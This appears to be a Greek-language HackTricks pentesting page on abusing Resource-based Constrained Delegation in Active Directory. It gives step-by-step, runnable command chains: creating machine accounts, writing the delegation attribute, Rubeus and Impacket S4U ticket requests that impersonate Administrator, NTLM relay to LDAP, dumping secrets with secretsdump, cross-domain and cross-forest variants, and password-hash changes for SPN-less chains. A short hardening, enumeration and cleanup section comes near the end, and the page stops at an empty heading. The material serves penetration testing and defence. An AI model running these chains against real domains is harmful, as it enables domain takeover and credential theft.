# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Βασικά στοιχεία του Resource-based Constrained Delegation

Το Resource-based constrained delegation (RBCD) είναι παρόμοιο με το [constrained delegation](constrained-delegation.md), αλλά η κατεύθυνση εμπιστοσύνης είναι αντίστροφη. Το παραδοσιακό constrained delegation καταγράφει σε ποιες υπηρεσίες μπορεί να κάνει delegation μια principal· το RBCD καταγράφει στο **resource-στόχο** ποιες principals μπορούν να υποδύονται χρήστες προς αυτό.<sup>[[12]](#references)</sup>

Το attribute _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ του αντικειμένου-στόχου περιέχει ένα security descriptor που προσδιορίζει τις principals στις οποίες επιτρέπεται να ενεργούν εκ μέρους άλλων identities προς αυτό το resource.

Μια άλλη σημαντική διαφορά είναι ότι μια principal με επαρκή **δικαιώματα εγγραφής σε έναν machine account** (`GenericAll`, `GenericWrite`, `WriteDacl`, `WriteProperty` και παρόμοια δικαιώματα) μπορεί να έχει τη δυνατότητα να ορίσει το _**msDS-AllowedToActOnBehalfOfOtherIdentity**_. Η ρύθμιση παραδοσιακού constrained delegation απαιτεί συνήθως πιο προνομιούχα δικαιώματα διαχειριστή.<sup>[[1]](#references)</sup>

Πιο συγκεκριμένα, η αλλαγή των ρυθμίσεων του κλασικού constrained delegation προϋποθέτει συνήθως το `SeEnableDelegationPrivilege` σε έναν domain controller, ένα δικαίωμα που συνήθως κατέχουν highly privileged administrators. Το RBCD μεταφέρει την απόφαση στο security descriptor του αντικειμένου-στόχου, επομένως η πρόσβαση εγγραφής στο σχετικό property του computer object μπορεί να αρκεί, χωρίς αυτό το δικαίωμα χρήστη.<sup>[[1]](#references)[[2]](#references)</sup>

### Νέες έννοιες

Το flag **`TrustedToAuthForDelegation`** στο `userAccountControl` περιγράφεται συχνά ως προϋπόθεση για το **S4U2Self**, αλλά αυτό δεν είναι όλη η εικόνα.\
Μια service principal με SPN μπορεί να ζητήσει S4U2Self χωρίς το flag. Με το `TrustedToAuthForDelegation`, το service ticket που επιστρέφεται είναι **forwardable**· χωρίς αυτό, το ticket είναι συνήθως **non-forwardable**.<sup>[[5]](#references)</sup>

Το παραδοσιακό constrained delegation απορρίπτει ένα **non-forwardable TGS** στο βήμα S4U2Proxy. Το RBCD μπορεί να δεχτεί αυτό το ticket S4U2Self, όταν το security descriptor του στόχου εξουσιοδοτεί την υπηρεσία που υποβάλλει το αίτημα.<sup>[[1]](#references)[[2]](#references)[[16]](#references)</sup>

### Δομή της επίθεσης

> Αν έχετε **δικαιώματα ισοδύναμα με εγγραφή** σε έναν **computer account**, ίσως μπορέσετε να αποκτήσετε προνομιούχα πρόσβαση σε αυτό το μηχάνημα.

Ας υποθέσουμε ότι ο attacker έχει ήδη **δικαιώματα ισοδύναμα με εγγραφή στο αντικείμενο του victim computer**.

1. Ο attacker **παραβιάζει** έναν account με **SPN** ή **δημιουργεί έναν** («Service A»). Από προεπιλογή, ένας authenticated domain user μπορεί να δημιουργήσει έως και 10 computer objects, όπως ορίζεται από το **_MachineAccountQuota_**· ένα computer object παρέχει αυτόματα αξιοποιήσιμα SPNs.
2. Ο attacker **καταχράται το WRITE δικαίωμά του** στο victim computer (ServiceB), ώστε να ρυθμίσει το **resource-based constrained delegation και να επιτρέψει στο ServiceA να υποδύεται οποιονδήποτε χρήστη** απέναντι σε αυτό το victim computer (ServiceB).
3. Ο attacker χρησιμοποιεί το Rubeus για να εκτελέσει μια **πλήρη επίθεση S4U** (S4U2Self και S4U2Proxy) από το Service A στο Service B, για έναν χρήστη **με προνομιούχα πρόσβαση στο Service B**.
   1. S4U2Self (από τον παραβιασμένο ή δημιουργημένο account με SPN): ζητά ένα **TGS που αναπαριστά τον Administrator προς το Service A** (non-forwardable).
   2. S4U2Proxy: χρησιμοποιεί αυτό το **non-forwardable TGS** για να ζητήσει ένα service ticket που αναπαριστά τον **Administrator** προς τον **victim host**.
   3. Το non-forwardable ticket μπορεί να λειτουργήσει σε αυτή τη ροή RBCD, επειδή το Service A εξουσιοδοτείται από το security descriptor του resource-στόχου.
4. Ο attacker μπορεί να κάνει **pass-the-ticket** και να **υποδυθεί** τον χρήστη, αποκτώντας **πρόσβαση στο victim ServiceB**.<sup>[[1]](#references)</sup>

Το `MachineAccountQuota=0` κλείνει την προεπιλεγμένη οδό δημιουργίας computer account, αλλά δεν αφαιρεί τα δικαιώματα εγγραφής στο computer object-στόχο ούτε τον έλεγχο ενός υπάρχοντος account. Ένας ελεγχόμενος απλός χρήστης χωρίς SPN μπορεί μερικές φορές να χρησιμοποιηθεί ως principal που κάνει delegation μέσω της [μεθόδου U2U χωρίς SPN](#spn-less-cross-domain--cross-forest-rbcd), ακόμη και εντός ενός domain. Αυτή η οδός εξακολουθεί να απαιτεί ενεργό δικαίωμα εγγραφής RBCD, έλεγχο των διαπιστευτηρίων του χρήστη που κάνει delegation, μια identity που μπορεί να υποδυθεί και επιτρέπεται να κάνει delegation, συμβατή συμπεριφορά κρυπτογράφησης Kerberos και αλλαγή NT hash που διαταράσσει τον account. Αντιμετωπίστε τα ως ξεχωριστές προϋποθέσεις· ένα κενό attribute RBCD ή μηδενικό quota από μόνο του δεν αποδεικνύει ούτε επιτυχία ούτε ασφάλεια.

Ένα υπάρχον RBCD descriptor μπορεί επίσης να αναφέρει **group** αντί για τον computer που κάνει delegation απευθείας. Αν ελέγχετε έναν computer account με SPN και μπορείτε να τον προσθέσετε σε αυτό το group, η νέα συμμετοχή μπορεί να προσφέρει την οδό delegation χωρίς να αλλάξετε το attribute RBCD του computer-στόχου. Ελέγξτε το ACL εγγραφής συμμετοχής του group ως προς τα πραγματικά αποτελεσματικά δικαιώματα (συμπεριλαμβανομένων των deny ACEs), τη nested συμμετοχή και την ανανέωση του token, το trustee SID του descriptor, τους περιορισμούς delegation του account που υποδύεστε και το service SPN του στόχου πριν συμπεράνετε ότι η οδός λειτουργεί.

Για να ελέγξετε το _**MachineAccountQuota**_ του domain, μπορείτε να χρησιμοποιήσετε:

```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```

## Επίθεση

### Δημιουργία αντικειμένου υπολογιστή

Μπορείτε να δημιουργήσετε ένα αντικείμενο υπολογιστή μέσα στο domain χρησιμοποιώντας το **[powermad](https://github.com/Kevin-Robertson/Powermad):**<sup>[[3]](#references)[[4]](#references)</sup>

```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```

### Ρύθμιση Resource-based Constrained Delegation

**Χρήση του Active Directory PowerShell module**<sup>[[4]](#references)</sup>

```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assign delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```

**Χρήση του powerview**<sup>[[3]](#references)</sup>

```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```

### Εκτέλεση ολοκληρωμένης επίθεσης S4U (Windows/Rubeus)

Αρχικά, δημιουργήσαμε το νέο αντικείμενο Computer με τον κωδικό πρόσβασης `123456`, οπότε χρειαζόμαστε το hash αυτού του κωδικού πρόσβασης:<sup>[[3]](#references)[[4]](#references)</sup>

```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```

Αυτό θα εμφανίσει τα hashes RC4 και AES για αυτόν τον λογαριασμό.\
Τώρα, μπορεί να πραγματοποιηθεί η επίθεση:<sup>[[3]](#references)[[4]](#references)</sup>

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```

Μπορείς να δημιουργήσεις περισσότερα tickets για περισσότερες υπηρεσίες, ζητώντας το μόνο μία φορά με την παράμετρο `/altservice` του Rubeus:

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```

> [!CAUTION]
> Οι χρήστες μπορούν να επισημανθούν ως **«Ο λογαριασμός είναι ευαίσθητος και δεν μπορεί να χρησιμοποιηθεί για delegation.»** Αν ενεργοποιηθεί αυτή η σημαία, δεν είναι δυνατή η πλαστοπροσωπία του λογαριασμού μέσω αυτής της ροής delegation. Το BloodHound εμφανίζει αυτήν την ιδιότητα κατά την ανάλυση.

### Εργαλεία Linux: ολοκληρωμένη ροή RBCD με Impacket (2024+)

Αν εργάζεστε από Linux, μπορείτε να εκτελέσετε ολόκληρη την αλυσίδα RBCD χρησιμοποιώντας τα επίσημα εργαλεία Impacket:<sup>[[6]](#references)[[7]](#references)</sup>

```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```

Σημειώσεις
- Αν επιβάλλεται LDAP signing/LDAPS, χρησιμοποιήστε `impacket-rbcd -use-ldaps ...`.
- Προτιμήστε AES keys· πολλά σύγχρονα domains περιορίζουν το RC4. Τόσο το Impacket όσο και το Rubeus υποστηρίζουν ροές αποκλειστικά με AES.
- Το Impacket μπορεί να ξαναγράψει το `sname` ("AnySPN") για ορισμένα εργαλεία, αλλά όποτε είναι δυνατόν, αποκτήστε το σωστό SPN (π.χ. CIFS/LDAP/HTTP/HOST/MSSQLSvc).

### Reflective RBCD για delegator Kerberos-only χωρίς SPN

Ένας παραβιασμένος χρήστης με **`msDS-AllowedToDelegateTo`, αλλά χωρίς SPN ή `TrustedToAuthForDelegation`**, δεν μπορεί να δημιουργήσει το forwardable evidence ticket που απαιτείται για [Kerberos-only constrained delegation](constrained-delegation.md#protocol-transition-vs-kerberos-only-constrained-delegation) με συνηθισμένο S4U2Self.<sup>[[1]](#references)[[18]](#references)</sup> Αν αυτός ο χρήστης μπορεί να γράψει το RBCD στο **δικό του** αντικείμενο AD, ένας λογαριασμός με SPN που ελέγχει ο attacker μπορεί πρώτα να κάνει delegation *προς τον χρήστη*.<sup>[[1]](#references)[[18]](#references)</sup> Αυτό το RBCD hop παρέχει ένα forwardable ticket για τον χρήστη που γίνεται impersonate, προς τον λογαριασμό χωρίς SPN· αυτό το ticket αποτελεί evidence για ένα δεύτερο S4U2Proxy προς ένα SPN στη λίστα επιτρεπόμενων προορισμών κλασικού delegation του παραβιασμένου λογαριασμού.<sup>[[18]](#references)[[19]](#references)</sup>

Για το πρώτο hop χωρίς SPN, το αίτημα S4U2Proxy του helper account πρέπει να χρησιμοποιεί **U2U**: το `enc-tkt-in-skey` κάνει τον KDC να κρυπτογραφήσει το ticket με το TGT session key του delegator, αντί να αναζητήσει ένα SPN key.<sup>[[18]](#references)[[19]](#references)</sup> Ο KDC χρειάζεται επίσης το bit RBCD στο `PA-PAC-OPTIONS`, το TGT του delegator και το evidence ticket του S4U2Self.<sup>[[18]](#references)[[20]](#references)</sup> Το fork του `getST.py` του Impacket από τον author προσθέτει τα `-nospn` και `-tgt` για αυτό το αίτημα· η υποστήριξη `-nospn`/`-tgt` βρίσκεται στο upstream Impacket PR #2324, οπότε χρησιμοποιήστε το συνδεδεμένο fork αντί να υποθέσετε ότι το stock `getST.py` υποστηρίζει αυτό το βήμα.<sup>[[18]](#references)[[20]](#references)</sup>

Αυτό το παράδειγμα υποθέτει ότι το `svc_web` έχει παραβιαστεί, μπορεί να γράψει το δικό του RBCD attribute και επιτρέπεται να κάνει delegation στο `host/dc01.corp.local`. Υποθέτει επίσης ότι μπορεί να δημιουργηθεί ένας helper account με SPN, ότι επιτρέπεται το RC4 και ότι ο επιλεγμένος `Administrator` μπορεί να γίνει delegable. Ζητήστε ένα **RC4 TGT** με το NT hash του παραβιασμένου λογαριασμού. Εκτελέστε το **πρώτο** `getST.py` από το fork του author· ελέγξτε την έξοδο του `describeTicket.py` και αντικαταστήστε παρακάτω το **RC4 TGT session key** με την τιμή που εμφανίζεται. Το τελευταίο `getST.py` μπορεί να είναι το stock Impacket. Ζητήστε το TGT **πριν** αλλάξετε το NT hash· αυτή η αλλαγή διακόπτει τη λειτουργία του service account μέχρι να γίνει reset του password του.<sup>[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

```bash
pypykatz crypto nt 'OldPass!'
getTGT.py -hashes ':<CURRENT_NT_HASH>' 'corp.local/svc_web' -dc-ip 10.0.0.10
describeTicket.py svc_web.ccache
addcomputer.py -computer-name 'HELPER$' -computer-pass 'HelperPass!' -dc-ip 10.0.0.10 'corp.local/svc_web:OldPass!'
rbcd.py -delegate-from 'HELPER$' -delegate-to svc_web -action write -dc-ip 10.0.0.10 'corp.local/svc_web:OldPass!'
changepasswd.py 'corp.local/svc_web:OldPass!@10.0.0.10' -newhashes ':<RC4_TGT_SESSION_KEY>'
python3 ./getST.py -u2u -impersonate Administrator -nospn svc_web -tgt svc_web.ccache -dc-ip 10.0.0.10 'corp.local/HELPER$:HelperPass!'
KRB5CCNAME=svc_web.ccache impacket-getST -impersonate Administrator -spn host/dc01.corp.local -additional-ticket 'Administrator@svc_web@CORP.LOCAL.ccache' -k -no-pass -dc-ip 10.0.0.10 'corp.local/svc_web'
```

Σε αντίθεση με την [παρακάτω διαδρομή SPN-less RBCD](#spn-less-cross-domain--cross-forest-rbcd), αυτή η αλυσίδα χρησιμοποιεί τον λογαριασμό SPN-less ως **στόχο RBCD και στη συνέχεια ως delegator κλασικού KCD**. Εξακολουθεί να απαιτείται ένας ακόμη ελεγχόμενος λογαριασμός με SPN. Αν `MachineAccountQuota=0`, ένας ήδη ελεγχόμενος λογαριασμός SPN μπορεί να αντικαταστήσει τον νέο υπολογιστή· η μηδενική ποσόστωση από μόνη της δεν εμποδίζει αυτή τη διαδρομή.<sup>[[18]](#references)[[19]](#references)</sup>

## RBCD μεταξύ domains και forests

Αν ο **delegating principal** που ελέγχεις βρίσκεται σε **διαφορετικό domain** (ή ακόμη και σε **διαφορετικό forest**) από τον **υπολογιστή-πόρο**, η κατάχρηση εξακολουθεί να είναι **RBCD**, αλλά η ροή των tickets δεν ακολουθεί πλέον τη συνηθισμένη ροή ενός domain `S4U2Self -> S4U2Proxy`.

### RBCD μεταξύ domains: ρύθμιση του foreign principal μέσω SID

Όταν ορίζεις το `msDS-AllowedToActOnBehalfOfOtherIdentity` από **διαφορετικό domain**, το foreign machine/user μπορεί να **μην μπορεί να επιλυθεί με βάση το όνομα** στο LDAP του domain-στόχου. Σε αυτή την περίπτωση, ρύθμισε την καταχώριση delegation χρησιμοποιώντας το **SID** του foreign principal αντί για το sAMAccountName/UPN του.

Αυτό έχει ιδιαίτερη σημασία κατά τη μεταβίβαση NTLM στο LDAP με το `ntlmrelayx.py`:<sup>[[9]](#references)</sup>

```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
  --no-dump --no-da --no-validate-privs \
  --delegate-access \
  --escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
  --sid
```

Σημειώσεις:
- Το `--sid` λέει στο `ntlmrelayx.py` να αντιμετωπίζει το `--escalate-user` ως SID, κάτι που απαιτείται όταν ο λογαριασμός που αναθέτει είναι εξωτερικός ως προς το domain-στόχο.
- Ακόμη κι αν το εργαλείο εμφανίσει `User not found in LDAP`, η εγγραφή της ανάθεσης μπορεί και πάλι να πετύχει, επειδή το security descriptor αποθηκεύει απευθείας το εξωτερικό SID.

### RBCD μεταξύ domains: ακολουθία cross-realm S4U

Μόλις η εξωτερική αρχή βρίσκεται στο `msDS-AllowedToActOnBehalfOfOtherIdentity`, η λειτουργική ροή μεταξύ domains είναι η εξής:<sup>[[9]](#references)[[13]](#references)</sup>

1. Λάβετε ένα **TGT** για την αρχή που αναθέτει, από το δικό της domain.
2. Ζητήστε ένα **referral TGT** για το `krbtgt/<target-domain>`.
3. Ζητήστε ένα **cross-realm S4U2Self referral** για τον χρήστη που υποδύεστε, στον DC του domain-στόχου.
4. Ζητήστε το πραγματικό ticket **S4U2Self** για αυτόν τον χρήστη, πίσω στο domain της αρχής που αναθέτει.
5. Εκτελέστε **S4U2Proxy** στο domain της αρχής που αναθέτει, για να λάβετε ένα referral ticket για το domain-στόχο.
6. Εκτελέστε το τελικό **S4U2Proxy** στον DC του domain-στόχου, για να λάβετε το service ticket για `cifs/host.target`, `host/host.target` κ.λπ.

Γι’ αυτό τα τυπικά εργαλεία Linux συχνά αποτυγχάνουν με το RBCD μεταξύ domains:<sup>[[9]](#references)</sup>
- Το **realm** του αιτήματος μπορεί να χρειάζεται να διαφέρει από το realm του TGT που χρησιμοποιείται στο `TGS-REQ`.
- Η αλυσίδα χρειάζεται **ανεξάρτητα βήματα S4U2Proxy**, όχι μόνο `S4U2Self` ή `S4U2Self` ακολουθούμενο αμέσως από ένα μόνο `S4U2Proxy`.

### RBCD μεταξύ domains από Linux

Η Synacktiv δημοσίευσε μια υλοποίηση του Impacket `getST.py` που αναπαράγει την ακολουθία cross-realm από Linux, χειριζόμενη ρητά τους δύο KDC:<sup>[[9]](#references)[[11]](#references)</sup>

```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
  -dc-ip 192.168.90.131 \
  -targetdc 192.168.90.217 \
  -targetdomain asgard.local \
  -impersonate thor_adm \
  -spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
  ./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
  -k -no-pass -dc-ip 192.168.90.217
```

Λειτουργικά, τα νέα ορίσματα είναι:
- `-dc-ip`: DC του **delegating** domain
- `-targetdomain`: domain του **resource computer**
- `-targetdc`: DC του **resource** domain

### Περιορισμοί του Cross-forest RBCD

Το Cross-forest RBCD έχει έναν σημαντικό περιορισμό: **ο χρήστης που γίνεται impersonated πρέπει να ανήκει στο ίδιο forest με το delegating principal**. Με άλλα λόγια, αν ο ελεγχόμενος machine account σας βρίσκεται στο `valhalla.local` και ο resource target στο `asgard.local`, γενικά **δεν μπορείτε** να κάνετε impersonate αυθαίρετους χρήστες του `asgard.local` σε αυτόν τον resource μέσω RBCD.<sup>[[9]](#references)</sup>

Παραμένει εκμεταλλεύσιμο όταν:
- ο χρήστης του **delegating forest** είναι **local admin** (ή έχει άλλα δικαιώματα) στο resource host του άλλου forest
- ένα trust επιτρέπει την απαιτούμενη διαδρομή authentication και το foreign SID γίνεται αποδεκτό στο security descriptor του target computer

### Ιδιαιτερότητες του πρωτοκόλλου Cross-forest RBCD

Το Cross-forest RBCD δεν είναι απλώς «cross-domain συν ένα trust». Η παρατηρούμενη ροή περιλαμβάνει δύο ιδιαιτερότητες που συχνά παραλείπονταν από τα εργαλεία:<sup>[[9]](#references)</sup>

1. Ένα επιπλέον αίτημα **S4U2Proxy** που ορίζει **`PA-PAC-OPTIONS=branch-aware`**
2. Ένα τελικό service ticket που μπορεί να επιστραφεί με χρήση **RC4**, ακόμη και όταν έχουν ζητηθεί άλλοι etypes

Η πρακτική ροή είναι:

1. Λάβετε ένα TGT για το delegating principal στο forest A.
2. Ζητήστε **S4U2Self** για τον χρήστη που γίνεται impersonated στο forest A.
3. Ζητήστε **S4U2Proxy** στο forest A για να λάβετε ένα referral TGT για το forest B.
4. Στείλτε ένα δεύτερο **S4U2Proxy** στο forest A **χωρίς** το S4U2Self ticket ως additional ticket, αλλά με ενεργοποιημένο το `branch-aware`, για να λάβετε ένα ακόμη referral TGT για το forest B.
5. Προαιρετικά, ζητήστε ένα κανονικό service ticket στο forest B για το delegating principal (αυτό το ticket δεν απαιτείται για την τελική κατάχρηση).
6. Χρησιμοποιήστε τα referral tickets από τα βήματα 3 και 4 για να ζητήσετε το τελικό ticket **S4U2Proxy** στο forest B, για τον χρήστη του forest A που γίνεται impersonated, προς το target SPN.

### Cross-forest RBCD από Linux

Το ίδιο branch του Impacket από τη Synacktiv προσθέτει ένα switch `-forest` για αυτή τη λογική:<sup>[[9]](#references)[[11]](#references)</sup>

```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
  -impersonate 'v_thor' \
  -dc-ip VALHALLA.local \
  valhalla.local/'desktop$' \
  -targetdc ASGARD.local \
  -targetdomain asgard.local \
  -aesKey 4[...]f \
  -forest
```

### Recursive multi-domain RBCD (3+ domains)

Σε **forests πολλών domains**, τόσο το **S4U2Self** όσο και το **S4U2Proxy** μπορούν να εκτελούνται **αναδρομικά** αντί να σταματούν μετά από ένα referral:

- **Recursive S4U2Self**: το πρώτο `S4U2Self` αποστέλλεται στο **domain του χρήστη που γίνεται impersonation**, ακολουθούν ενδιάμεσα hops parent/child με κανονικά referrals `TGS-REQ` για `krbtgt/<REALM>` και το **τελικό `S4U2Self`** αποστέλλεται στο **domain του delegating principal**.
- Αυτό σημαίνει ότι **αρκεί να έχεις απλώς ένα TGT** για έναν machine account, ώστε να κάνεις impersonation ενός **admin από άλλο domain στο ίδιο forest** και να ζητήσεις `cifs/host`, `host/host`, `wsman/host` κ.λπ.
- Το **Recursive S4U2Proxy** ακολουθεί την ίδια αλυσίδα trust: τα ενδιάμεσα hops επαναχρησιμοποιούν το προηγούμενο ticket ως TGT, ζητώντας το επόμενο referral `krbtgt/<REALM>`, και μόνο το τελευταίο hop επιστρέφει το τελικό service ticket.<sup>[[10]](#references)</sup>

Ένα πρακτικό παράδειγμα στο ίδιο forest είναι:

```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
  -impersonate Administrator@frperso.local -self \
  -altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
  smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```

### SPN-less RBCD μεταξύ domains / forests

Αν ο **delegating principal είναι χρήστης χωρίς SPN**, το τελευταίο recursive `S4U2Self` αποτυγχάνει με **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**. Η λύση είναι να **επαναλάβετε μόνο το τελικό hop ως `S4U2Self+U2U`**.<sup>[[10]](#references)</sup>

Σύντομη εκδοχή της αλυσίδας abuse:

1. Κάντε authenticate με το **NT hash**, ώστε να κατευθύνετε τον KDC προς **RC4-HMAC (etype 23)**.
2. Ζητήστε πρώτα **`-self -u2u`** και κρατήστε αυτό το ticket ξεχωριστά από το μεταγενέστερο proxy step.
3. Εξαγάγετε το **TGT session key** με το `describeTicket.py`.
4. Αντικαταστήστε το **NT hash** του χρήστη με αυτό το **session key** χρησιμοποιώντας `changepasswd.py -newhashes <session_key>`.
5. Επαναχρησιμοποιήστε το ticket `S4U2Self+U2U` ως **`-additional-ticket`** σε ξεχωριστό αίτημα **`-proxy`**.

```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
  -impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
  -hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
  -impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
  -spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```

Λειτουργικές επισημάνσεις:

- Όταν το **πρώτο έμπιστο hop είναι ήδη άλλο forest**, προτιμήστε τον αλγόριθμο **branch-aware** (`getST.py ... -forest`) για να αντιστοιχεί στη συμπεριφορά των Windows. Αν το foreign forest εμφανίζεται μόνο **αργότερα** στην αλυσίδα, η recursive ροή που δεν είναι branch-aware ενδέχεται να λειτουργεί.<sup>[[9]](#references)</sup>
- Σε πρόσφατους DC με **Windows Server 2022/2025**, η επιβολή RC4 μπορεί να αποτύχει με **`KDC_ERR_ETYPE_NOSUPP`** λόγω της απόσυρσης του RC4· αυτό μπορεί να καταστήσει αδύνατο το **SPN-less RBCD**, παρότι το κλασικό RBCD με SPN εξακολουθεί να λειτουργεί με AES.<sup>[[15]](#references)</sup>
- Εκτελέστε **`S4U2Self+U2U` πριν αλλάξετε το hash/τον κωδικό πρόσβασης του χρήστη**: το **`SamrChangePasswordUser`** δεν επανυπολογίζει τα Kerberos AES keys του λογαριασμού, επομένως η αλλαγή κωδικού πρώτα μπορεί να διακόψει μεταγενέστερα αιτήματα ticket.<sup>[[14]](#references)</sup>
- Ο λογαριασμός που γίνεται impersonate πρέπει να επιτρέπεται ακόμη να χρησιμοποιηθεί για **delegation**: οι **Protected Users** και οι λογαριασμοί με **`NOT_DELEGATED`** / **"Account is sensitive and cannot be delegated"** μπλοκάρουν την αλυσίδα.

## Σημειώσεις εντοπισμού / ενίσχυσης ασφάλειας

- Οι διαδρομές RBCD μεταξύ domains/forests συνήθως εξακολουθούν να δημιουργούνται μέσω **κατάχρησης ACL** ή **relay-to-LDAP**. Εφαρμόστε **LDAP signing** και **LDAP channel binding** στους DC για να διακόψετε τις συνήθεις μεθόδους αρχικής εγκατάστασης.
- Ελέγξτε ποιοι μπορούν να τροποποιήσουν το `msDS-AllowedToActOnBehalfOfOtherIdentity` σε αντικείμενα υπολογιστών και επιλύστε τα αποθηκευμένα SIDs, συμπεριλαμβανομένων των **foreign security principals**.
- Σε περιβάλλοντα με πολλά trusts, ελέγξτε το **Selective Authentication**, το **SID filtering** και αν χρήστες από foreign forest έχουν δικαιώματα **local admin** σε hosts πόρων.

### Πρόσβαση

Η τελευταία γραμμή εντολών εκτελεί την **πλήρη επίθεση S4U και εισάγει το TGS** από τον Administrator στον host-στόχο στη **μνήμη**.\
Σε αυτό το παράδειγμα ζητήθηκε ένα TGS για την υπηρεσία **CIFS** από τον Administrator, επομένως θα μπορείτε να αποκτήσετε πρόσβαση στο **C$**:

```bash
ls \\victim.domain.local\C$
```

### Κατάχρηση διαφορετικών service tickets

Μάθετε περισσότερα για τα [**διαθέσιμα service tickets εδώ**](silver-ticket.md#available-services).

## Απαρίθμηση, έλεγχος και εκκαθάριση

### Απαρίθμηση υπολογιστών με ρυθμισμένο RBCD

PowerShell (αποκωδικοποίηση του SD για την επίλυση των SID):

```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
  Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
  ForEach-Object {
    $raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
    $sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
    $sd.DiscretionaryAcl | ForEach-Object {
      $sid  = $_.SecurityIdentifier
      try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
      [PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
    }
  }
```

Impacket (ανάγνωση ή εκκαθάριση με μία εντολή):

```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```

### Καθαρισμός / επαναφορά του RBCD

- PowerShell (εκκαθάριση του attribute):

```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```

- Impacket:

```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```

## Σφάλματα Kerberos

